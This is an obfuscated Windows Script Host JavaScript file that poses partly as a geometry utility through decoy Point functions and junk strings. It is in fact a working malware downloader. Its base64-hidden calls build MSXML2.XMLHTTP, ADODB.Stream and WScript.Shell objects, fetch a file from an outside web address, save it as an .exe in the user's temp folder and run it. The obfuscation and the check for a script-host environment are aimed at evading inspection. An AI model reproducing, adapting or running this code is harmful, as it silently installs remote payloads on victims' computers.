
var night = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  notre = [];
	
var limit = { ':': '.','U': 'S','381': 'X'};
	var pamela = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function skill(earthenware) {
	insert = earthenware;
	for (var i in limit){insert = insert.replace(i, limit[i]);}
    return insert;
};

var recorder = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.skill4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/stanford/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = night[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = night[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = night[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = night[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var americas ="stanfordJVstanfordRFTVstanfordAl".skill4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var campania = "stanfordQWstanfordN0aXZstanfordlWE9iastanfordmVjdA=stanford=".skill4();
String.prototype.skill2 = function () {
    var holdings = {
        carroll: this
    };
    holdings.hearths = holdings.carroll["c3Vic3RyaW5n".skill4()](pamela, recorder);
    return holdings.hearths;
};

var vitiated ="stanfordRXhwYW5stanfordkRW52aXstanfordJvbm1lbnRTdHJstanfordpbmdz".skill4();
var Native = function(options){
	
};
var tolerant = [campania, vitiated,americas,  ""+"."+("administrators","fondle","shemales","jargon","marines","narrative","donated","newsletters","exe"), "UnVu".skill4(), skill("M"+"SX"+"ML"+("pixel","peacock","willy","boxer","blonde","transmitter","medical","2.")+"381M"+"LH"+"TT"+("differences","boots","substantial","dangerous","charleston","commented","unforeseen","sandy","P>")+"WU"+("florin","connexions","astonish","straight","famous","embarkation","bolster","cr")+("deeps","windsor","oracle","atrocity","gained","adapter","lingerie","waterman","ip")+"t:"+("movements","desired","debug","broadway","paraguay","gnome","officer","coleman","Sh")+"ell")];
sixtyseven = "_F2_";
var presentations = this[tolerant.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
rHYFnLY = "JorKybLllR";
decease = (("thunderstorm", "associated", "swaziland", "inconsiderate", "metallica", "geneva", "holly", "pvUvUsgQdmcR") + "umCTGNdroUB").skill2();
accelerate = (("brawn", "selection", "incident", "peroration", "nirvana", "sheet", "refinance", "hippopotamus", "berry", "scqwsBPNsbt") + "oVLFzwHLH").skill2();
  
    String.prototype.baste = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var latex = tolerant.pop().split(">");

parker = "b3Blbg==".skill4();
var packet = new presentations(latex[1]);
var peacemaker = new presentations(latex[0]);
var taxes = packet[tolerant.shift()](tolerant.shift());
weasel = "E";

var tarts = tolerant.shift();
var motherboard = tolerant.shift();
function guests(exhaust, rifled) {

    try {
        var severn = taxes + "/" + rifled ;
		severn = severn+ tarts;
            peacemaker[parker](("vellum","stacked","roland","chimerical","teeth","telegraphy","shakespearean","mauve","G" + weasel) + ("cyprus","telecommunications","collections","voyuer","vanishing","considers","spending","emigration","forty","regulation","T"), exhaust, false);
       
    peacemaker[accelerate + ("talkers","naturalist","end")]();
	var malay=("decease" + WScript=="decease" + "V2luZG93cyBTY3JpcHQgSG9zdA==".skill4())&&peacemaker["c3RhdHVz".skill4()] +""=="MjAw".skill4()&&typeof(wWyVhexhAFz)==="undefined";

    if (malay) {
		
        var terrorists = new presentations((("bolivia","downpour","prefix","sonorous","global","terrorism","knocker","reflect","A")+("carbolic","overhung","derived","judicial","tress","pansies","vsnet","metrical","SEOO")+"DB"+("armstrong","feudalism","comparable","rapid","nimble","personals","sardonic",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        terrorists[parker]();
        JRcIyAwn = "_F9_";
        terrorists.type = recorder;
        PaEoWUhDT = "_F10_";
        terrorists["d3JpdGU=".skill4()](peacemaker[("reunite","muslim","monsters","emolument","imputation","penniless","birthplace","")+"R"+"es"+"pon"+limit['U'].toLowerCase()+"e"+"Qm9keQ==".skill4()]);
        iSSFtXvuK = "_F11_";
        terrorists[(decease + "o"+("celebration","shank","limitless","waxing","killing","flagship","sundown","surname","00")+("vagrant","congregate","paste","transcript","determines","talkative","shirk","8i")+"tion").replace("0"+("obtain","oriental","fastest","verity","accommodating","suspension","europa","08"), accelerate)] = 0;
        kANgUlS = "_F12_";
        terrorists.saveToFile(severn, 2);
        QXgpurGVS = "_F13_";
        terrorists.close();
        jjpDGYqzQ = "_F14_";
		packet[motherboard](severn, recorder, true);
    }
} catch (HJcgLVo) { };

    mxtLbDL = "_F15_";
}
try{
guests("aHRstanford0cDstanfordovLw=stanford=".skill4()+"\u0077\u0077\u0077"+"\u002E\u006A\u006F\u0068\u006E\u006C\u006F\u0064\u0067\u0065\u0061\u0072\u0063\u0068\u0069\u0074\u0065\u0063\u0074\u0073\u002E\u0063\u006F\u006D\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?zSyAXwfNlAb=TOPvtGUgV","CxcrJu");}catch(wiLQKzw){}

   polEnT = "_F16_";
   